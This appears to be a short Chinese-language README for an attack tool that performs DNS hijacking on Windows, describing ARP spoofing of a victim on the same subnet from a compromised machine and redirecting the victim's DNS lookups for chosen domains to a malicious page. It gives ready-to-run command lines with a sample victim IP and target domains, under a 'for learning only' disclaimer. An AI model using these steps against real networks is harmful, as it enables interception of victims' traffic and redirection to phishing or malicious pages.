## 免责声明

涉及到的所有技术仅用来学习交流，严禁用于非法用途。否则产生的一切后果自行承担。

## 介绍

实现windows环境下的dns劫持需求，全程操作都是在被控机器A上完成。

假设机器A(被控)和机器B在一个C段：

1、在A上对B做arp欺骗，使B的所有流量到A。

2、修改B流量中的dns的解析规则，解析到恶意页面。

arp欺骗：

参考：https://github.com/alandau/arpspoof

dns劫持：

```
dns_hijacking.exe "网卡描述(ipconfig /all)" 受害者ip "要劫持的根域名"

dns_hijacking.exe "Intel(R) PRO/1000 MT Network Connection" 192.168.213.188 "baidu.com,2345.cc,2345.com,bing.com"
```





